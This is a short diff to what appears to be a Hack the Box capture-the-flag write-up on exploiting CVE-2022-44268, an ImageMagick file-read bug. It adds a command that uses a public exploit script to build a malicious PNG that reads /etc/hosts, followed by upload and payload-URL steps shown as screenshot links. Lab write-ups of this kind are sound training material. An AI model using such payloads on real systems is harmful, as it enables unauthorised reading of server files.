@@ -80,4 +80,12 @@ The suggested exploit has been scripted using rust. Using an explot scripted usi
 ```
 https://github.com/kljunowsky/CVE-2022-44268
 ```
+- Prepare Payload
+```Python
+python3 CVE-2022-44268.py --image image.png --file-to-read /etc/hosts --output payload.png
+```
+- Upload Payload
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e9cba83e-70ca-4960-a5f2-1807331d9673)
 
+- Payload URL
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/81f3e148-a8bb-4973-8a8b-ff322b454fd6)
